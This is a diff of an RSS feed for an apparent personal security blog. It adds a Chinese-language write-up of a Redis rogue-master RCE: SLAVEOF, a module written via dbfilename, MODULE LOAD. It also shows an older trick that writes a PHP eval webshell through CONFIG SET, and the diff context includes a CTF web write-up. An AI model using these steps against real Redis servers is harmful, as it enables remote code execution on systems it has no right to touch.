@@ -2,19 +2,166 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>n0b0dy&#39;s site on n0b0dy&#39;s site</title>
-    <link>http://n0b0dycn.github.io/</link>
+    <link>http://n0b0dycn.me/</link>
     <description>Recent content in n0b0dy&#39;s site on n0b0dy&#39;s site</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 01 Jun 2019 16:35:31 +0800</lastBuildDate>
+    <lastBuildDate>Sun, 07 Jul 2019 10:08:33 +0800</lastBuildDate>
     <atom:link href="/" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>Redis &lt;= 5.0.5 RCE</title>
+      <link>http://n0b0dycn.me/2019/07/redis-rce/</link>
+      <pubDate>Sun, 07 Jul 2019 10:08:33 +0800</pubDate>
+      
+      <guid>http://n0b0dycn.me/2019/07/redis-rce/</guid>
+      <description>
+
+&lt;h1 id=&#34;redis-5-0-5-rce&#34;&gt;Redis &amp;lt;= 5.0.5 RCE&lt;/h1&gt;
+
+&lt;p&gt;本文介绍由LCBC战队队员Pavel Toporkov在zeronights 2018上介绍的redis 4.x RCE攻击。会议slide链接：&lt;a href=&#34;https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;攻击场景：
+* 能够访问远程redis的端口（直接访问或者SSRF）
+* 对redis服务器可以访问到的另一台服务器有控制权&lt;/p&gt;
+
+&lt;p&gt;本文的exp开源在github上：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/n0b0dyCN/redis-rogue-server&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/n0b0dyCN/redis-rogue-server&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;欢迎大家来star~&lt;/p&gt;
+
+&lt;h2 id=&#34;背景知识&#34;&gt;背景知识&lt;/h2&gt;
+
+&lt;h3 id=&#34;redis协议&#34;&gt;redis协议&lt;/h3&gt;
+
+&lt;p&gt;redis支持两种传输协议，一种是明文传输，其命令如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;SET keyname value\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;另一种是经过编码的传输协议：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;*3\r\n$3\r\nSET\r\n$7\r\nkeyname\r\n$5\r\nval
+ue\r\n
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;将其格式化大概长这个样子：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;*&amp;lt;number of arguments&amp;gt; CR LF
+$&amp;lt;number of bytes of argument 1&amp;gt; CR LF
+&amp;lt;argument data&amp;gt; CR LF
+...
+$&amp;lt;number of bytes of argument N&amp;gt; CR LF
+&amp;lt;argument data&amp;gt; CR LF
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;笔者主要使用第二种协议实现exp。&lt;/p&gt;
+
+&lt;h3 id=&#34;config-set&#34;&gt;CONFIG SET&lt;/h3&gt;
+
+&lt;p&gt;CONFIG SET命令用于对redis进行配置。常用如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;CONFIG SET dir /VAR/WWW/HTML
+CONFIG SET dbfilename sh.php
+SET PAYLOAD &#39;&amp;lt;?php eval($_GET[0]);?&amp;gt;&#39;
+BGSAVE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;这是之前redis常用的getshell套路。但是由于权限问题，并不是总能成功写入文件。&lt;/p&gt;
+
+&lt;h3 id=&#34;slaveof&#34;&gt;SLAVEOF&lt;/h3&gt;
+
+&lt;p&gt;SLAVEOF命令为redis设置主服务器。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;127.0.0.1:6379&amp;gt; SLAVEOF 127.0.0.1 7000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;该命令将端口为6379的服务器的主服务器设置为端口为7000的服务器。端口为6379的服务器将开始同步端口为7000服务器的数据来保证数据的一致性。同时服务器可以随时取消主从状态：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;127.0.0.1:6379&amp;gt; SLAVEOF NO ONE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;SLAVE和MASTER之间的握手机制如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/redis-4.x-rce/sync-protocol.png&#34; alt=&#34;SYNC protocol&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;握手后SLAVE将向MASTER发送PSYNC请求同步，一般有三种状态：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;FULLRESYNC：表示需要全量复制&lt;/li&gt;
+&lt;li&gt;CONTINUE：表示可以进行增量同步&lt;/li&gt;
+&lt;li&gt;ERR：表示主服务器还不支持PSYNC&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;module-load&#34;&gt;MODULE LOAD&lt;/h3&gt;
+
+&lt;p&gt;MODULE LOAD命令为redis加载外部的模块，该模块可以自定义。模块编写方法可以参考官方示例：&lt;a href=&#34;https://github.com/RedisLabs/RedisModulesSDK&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;https://github.com/RedisLabs/RedisModulesSDK&lt;/a&gt;。&lt;/p&gt;
+
+&lt;p&gt;该命令使用方式如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;MODULE LOAD /path/to/exp.so
+MODULE UNLOAD exp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;攻击流程&#34;&gt;攻击流程&lt;/h2&gt;
+
+&lt;h3 id=&#34;rogue-server&#34;&gt;Rogue Server&lt;/h3&gt;
+
+&lt;p&gt;我们需要建一个服务器来在同步过程中向redis server发送我们的module。服务器要响应redis的请求：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;[&amp;gt;] PING - test if a connection is still alive
+[&amp;lt;] +PONG
+[&amp;gt;] REPLCONF - exchange replication information between master and slave
+[&amp;lt;] +OK
+[&amp;gt;] PSYNC/SYNC - synchronize slave state with the master
+[&amp;lt;] +FULLRESYNC
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;步骤&#34;&gt;步骤&lt;/h3&gt;
+
+&lt;h4 id=&#34;将redis设置为我们的slave&#34;&gt;将redis设置为我们的slave&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;SLAVEOF server port
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;设置redis的数据库文件&#34;&gt;设置redis的数据库文件&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;CONFIG SET dbfilename exp.so
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;从rogue-server接收module&#34;&gt;从rogue server接收module&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;+FULLRESYNC &amp;lt;Z*40&amp;gt; 1\r\n$&amp;lt;len&amp;gt;\r\n&amp;lt;payload&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&#34;加载模块&#34;&gt;加载模块&lt;/h4&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-redis&#34;&gt;MODULE LOAD ./exp.so
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;攻击效果&#34;&gt;攻击效果&lt;/h3&gt;
+
+&lt;p&gt;设置主服务器与数据库文件：
+&lt;img src=&#34;http://n0b0dycn.me/images/posts/redis-4.x-rce/step1.png&#34; alt=&#34;step 1&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;向redis server发送payload：
+&lt;img src=&#34;http://n0b0dycn.me/images/posts/redis-4.x-rce/step2.png&#34; alt=&#34;step 2&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;加载模块：
+&lt;img src=&#34;http://n0b0dycn.me/images/posts/redis-4.x-rce/step3.png&#34; alt=&#34;step 3&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最终可以实现命令执行：
+&lt;img src=&#34;http://n0b0dycn.me/images/posts/redis-4.x-rce/step4.png&#34; alt=&#34;step 4&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
       <title>About Me</title>
-      <link>http://n0b0dycn.github.io/about/</link>
+      <link>http://n0b0dycn.me/about/</link>
       <pubDate>Sat, 01 Jun 2019 16:35:31 +0800</pubDate>
       
-      <guid>http://n0b0dycn.github.io/about/</guid>
+      <guid>http://n0b0dycn.me/about/</guid>
       <description>
 
 &lt;h1 id=&#34;me&#34;&gt;Me&lt;/h1&gt;
@@ -75,10 +222,10 @@
     
     <item>
       <title>Alpha 21264</title>
-      <link>http://n0b0dycn.github.io/2019/04/alpha-21264/</link>
+      <link>http://n0b0dycn.me/2019/04/alpha-21264/</link>
       <pubDate>Thu, 11 Apr 2019 17:04:22 +0800</pubDate>
       
-      <guid>http://n0b0dycn.github.io/2019/04/alpha-21264/</guid>
+      <guid>http://n0b0dycn.me/2019/04/alpha-21264/</guid>
       <description>
 
 &lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
@@ -93,11 +240,11 @@
 
 &lt;p&gt;Alpha 21264的主频在500至600MHz之间，由15M个2.2V，0.35mm晶体管组成。芯片面积为$3.1cm^2$，有587个管脚。芯片平面图如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/die-photo.png&#34; alt=&#34;die photo&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/die-photo.png&#34; alt=&#34;die photo&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;芯片的结构抽象图如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/ins-pipeline.png&#34; alt=&#34;Instruction Pipeline&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/ins-pipeline.png&#34; alt=&#34;Instruction Pipeline&#34; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&#34;指令流-instruction-pipeline-fetch&#34;&gt;指令流 (Instruction Pipeline &amp;ndash; Fetch)&lt;/h2&gt;
 
@@ -109,7 +256,7 @@
 
 &lt;p&gt;Alpha 21264处理器的I-Cache是64Kb，2路组相连。处理器实现了路预测算法，结合了组相联的缓存效率与直接映射缓存的访问速度。取指部件的结构图如下：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/ins-fetch.png&#34; alt=&#34;Instruction Fetch&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/ins-fetch.png&#34; alt=&#34;Instruction Fetch&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;每次取四条指令之后，都会生成一个line和way的预测。该预测指向接下来四条指令的取指位置，包括line和way两个位置信息。处理器在根据预测读取接下来四条指令的同时，会并行地对正在执行的的四条指令的正确性进行检查。&lt;/p&gt;
 
@@ -129,7 +276,7 @@
 
 &lt;p&gt;Alpha 21264的转移预测系统从局部预测和全局预测中动态选择。再绝大多数benchmark中可以得到90%到100%的准确率。21264的预测器结构如下图：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/21264-predictor.png&#34; alt=&#34;Branch Predictor&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/21264-predictor.png&#34; alt=&#34;Branch Predictor&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;该图左侧是10-bit局部转移pattern，并包含3-bit计数器。局部预测器根据这10-bit从1024个转移计数器中选取一个。图右侧是12-bit的全局转移预测器，对应着全局信息表中的4096个条目之一。同时处理器还有一个Choice Predictor来决定选择哪个预测器的结果。这个predictor根据12-bit的全局记录对4096个条目进行索引。&lt;/p&gt;
 
@@ -141,7 +288,7 @@
 
 &lt;p&gt;下图是乱序执行部件的结构图：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/rename-map.png&#34; alt=&#34;Renaming map and queue&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/rename-map.png&#34; alt=&#34;Renaming map and queue&#34; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&#34;寄存器重命名&#34;&gt;寄存器重命名&lt;/h3&gt;
 
@@ -170,7 +317,7 @@
 
 &lt;p&gt;虽然指令被乱序执行，但是所有指令都是被按序retire的。按序retire保证了精确中断。当一个指令执行完毕后，当且仅当这条指令之前的所有指令都retire以后，这条指令才可以retire。按序retire要求处理器记录内部寄存器的使用。每条指令都会额外记录其目的寄存器的原值。当这条指令retire后，原值不可能再被用到，故即可丢掉。如果需要回滚指令，则可以使用保存的原值进行指令回滚。Retire部件有一个80个entry的窗口，提供了极高的并发度。下图展示了不同类型指令从issue到retire的最小需要的周期数：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/retire-pipe-stage.png&#34; alt=&#34;retire pipe stage&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/retire-pipe-stage.png&#34; alt=&#34;retire pipe stage&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;在较短的时间窗口内，retire机制在一个周期最多可以提交11条指令，并且可保持在每个周期retire 8条指令。&lt;/p&gt;
 
@@ -178,7 +325,7 @@
 
 &lt;p&gt;下图为执行引擎的结构：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/execution-pipes.png&#34; alt=&#34;execution pipes&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/execution-pipes.png&#34; alt=&#34;execution pipes&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;从图中我们可以看到，整个处理器有六个执行的流水线，其由两个浮点运算流水线与四个定点运算流水线组成。这些流水线在物理上被放置在相应的寄存器堆的上方或者下方。Alpha 21264处理器将定点的计算流水线划分为两个集群(cluster)，每个集群都会保存一整份寄存器堆。虽然定点寄存器集群需要额外的一个周期来广播寄存器的变化，这种设计大大简化了处理器的设计，并提升了处理器的性能。&lt;/p&gt;
 
@@ -205,7 +352,7 @@
 
 &lt;p&gt;下图展示了Alpha 21264中的指令延迟：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/ins-latencies.png&#34; alt=&#34;Instruction latencies&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/ins-latencies.png&#34; alt=&#34;Instruction latencies&#34; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&#34;内部存储系统-internal-memory-system&#34;&gt;内部存储系统 (Internal Memory System)&lt;/h2&gt;
 
@@ -215,7 +362,7 @@
 
 &lt;p&gt;Alpha 21264每周期支持两个不冲突的访存操作。为支持这一点，Alpha 21264的cache每周期支持两次访问（在时钟的上升沿和下降沿各一次）。所以Ahpha 21264的D-Cache访问频率是时钟频率的两倍，这是21264存储系统的重要特点。下图是21264存储系统的数据通路：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/memory-data-path.png&#34; alt=&#34;21264 internal memory data path&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/memory-data-path.png&#34; alt=&#34;21264 internal memory data path&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;两条64位的数据线路是内部存储系统的核心。每次load操作都会通过这两条数据线路从D-Cache、推测执行数据缓冲区(speculative store data buffer)或者外部系统数据中得到数据。Store指令则是先将数据存入推测执行数据缓冲区，当指令retire之后，数据才会被写入到D-Cache或者其它地方。每此对cache的写可以将两条写操作合并为一条写128位的数据。&lt;/p&gt;
 
@@ -233,7 +380,7 @@
 
 &lt;p&gt;下图是21264存储系统规划的示例：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/mem-pipeline.png&#34; alt=&#34;memory pipeline&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/mem-pipeline.png&#34; alt=&#34;memory pipeline&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;这张图没看懂，看懂了再补……&lt;/p&gt;
 
@@ -241,7 +388,7 @@
 
 &lt;p&gt;Alpha 21264设计了一套缓存预取指令，使得程序员可以充分利用缓存系统的高带宽。对于循环或者长数组的操作，这样的指令对程序加速很有帮助。下图是缓存预取与缓存管理的指令：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/cache-management.png&#34; alt=&#34;Cache prefetching and management&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/cache-management.png&#34; alt=&#34;Cache prefetching and management&#34; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&#34;总线接口-buf-interface-unit&#34;&gt;总线接口 (Buf Interface Unit)&lt;/h2&gt;
 
@@ -249,7 +396,7 @@
 
 &lt;p&gt;下图展示了21264的外部线路：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/Alpha-21264/external-interface.png&#34; alt=&#34;external-interface&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/Alpha-21264/external-interface.png&#34; alt=&#34;external-interface&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;芯片到L2的数据通路和芯片到system的数据通路时分离的。所有的通路都是高速的点对点通信。Alpha 21264使用clock-forwarding技术去最大化带宽利用。&lt;/p&gt;
 
@@ -269,10 +416,10 @@
     
     <item>
       <title>0ctf 2019 Quals Web writeup</title>
-      <link>http://n0b0dycn.github.io/2019/03/0ctf-2019-quals-web-writeup/</link>
+      <link>http://n0b0dycn.me/2019/03/0ctf-2019-quals-web-writeup/</link>
       <pubDate>Tue, 26 Mar 2019 16:04:55 +0800</pubDate>
       
-      <guid>http://n0b0dycn.github.io/2019/03/0ctf-2019-quals-web-writeup/</guid>
+      <guid>http://n0b0dycn.me/2019/03/0ctf-2019-quals-web-writeup/</guid>
       <description>
 
 &lt;p&gt;本次比赛两个web题都是&lt;a href=&#34;https://ricterz.me/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;RicterZ&lt;/a&gt;大佬出的，膜一波Orz&lt;/p&gt;
@@ -281,7 +428,7 @@
 
 &lt;p&gt;本题首先通过观察401的响应包找到HTTP Basic认证的用户名karaf：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/401.png&#34; alt=&#34;401.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/401.png&#34; alt=&#34;401.png&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后用密码karaf即可绕过认证。接下来通过目录爆破找到目录&lt;code&gt;http://karaf:karaf@192.168.2.88:31337/jolokia/&lt;/code&gt;。到这里我们可以发现这是一个裸的jolokia控制台。&lt;/p&gt;
 
@@ -295,15 +442,15 @@
 
 &lt;p&gt;第二种方法应该算是最省事的方法了，即通过karaf下feature模块安装一个webconsole：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/webconsole.png&#34; alt=&#34;webconsole&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/webconsole.png&#34; alt=&#34;webconsole&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;之后我们访问&lt;code&gt;http://192.168.2.88:31337/system/console/bundles&lt;/code&gt;就可以进入到webconsole的管理界面。在管理界面点Main -&amp;gt; Goto即可进入console。&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/goto.png&#34; alt=&#34;goto&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/goto.png&#34; alt=&#34;goto&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;在console中执行&lt;code&gt;cat /flag&lt;/code&gt;即可得到flag：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/console.png&#34; alt=&#34;console&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/console.png&#34; alt=&#34;console&#34; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&#34;解法-3&#34;&gt;解法 3&lt;/h3&gt;
 
@@ -317,23 +464,23 @@ void startInstance(String name, String opts, boolean wait, boolean debug) throws
 
 &lt;p&gt;我们找startInstance方法的实现，在文件&lt;code&gt;org/apache/karaf/instance/command/StartCommand.java&lt;/code&gt;中其调用了Instance的Start方法：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/startCommand.png&#34; alt=&#34;startCommand&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/startCommand.png&#34; alt=&#34;startCommand&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;跟进Instance类的start方法，其调用了InstanceService中的startInstance方法：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/instanceImpl.png&#34; alt=&#34;instanceImpl&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/instanceImpl.png&#34; alt=&#34;instanceImpl&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;继续跟进&lt;code&gt;org/apache/karaf/instance/core/internal/InstanceServiceImpl.java&lt;/code&gt;，其调用了doStart方法：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/startInstance.png&#34; alt=&#34;startInstance&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/startInstance.png&#34; alt=&#34;startInstance&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;继续看doStart方法，其中有明显的命令拼接：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/doStart.png&#34; alt=&#34;doStart&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/doStart.png&#34; alt=&#34;doStart&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;在此处，我们发现javaOpt是我们可控的参数。在&lt;code&gt;InstancesMBeanImpl&lt;/code&gt;中我们发现createInstance参数有一个就是javaOpt：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/mbean.png&#34; alt=&#34;mbean&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/mbean.png&#34; alt=&#34;mbean&#34; /&gt;&lt;/p&gt;
 
 &lt;p&gt;于是我们给出攻击思路：&lt;/p&gt;
 
@@ -465,16 +612,16 @@ var_dump(file_get_contents(&amp;quot;$home/flag&amp;quot;));
 
 &lt;p&gt;经过这一波操作我们可以最终得到flag：&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.github.io/images/posts/0ctf-2019-Quals-Web-writeup/wallbreaker.png&#34; alt=&#34;result&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://n0b0dycn.me/images/posts/0ctf-2019-Quals-Web-writeup/wallbreaker.png&#34; alt=&#34;result&#34; /&gt;&lt;/p&gt;
 </description>
     </item>
     
     <item>
       <title></title>
-      <link>http://n0b0dycn.github.io/links/</link>
+      <link>http://n0b0dycn.me/links/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>http://n0b0dycn.github.io/links/</guid>
+      <guid>http://n0b0dycn.me/links/</guid>
       <description>
 
 &lt;h1 id=&#34;useful-links&#34;&gt;Useful Links&lt;/h1&gt;
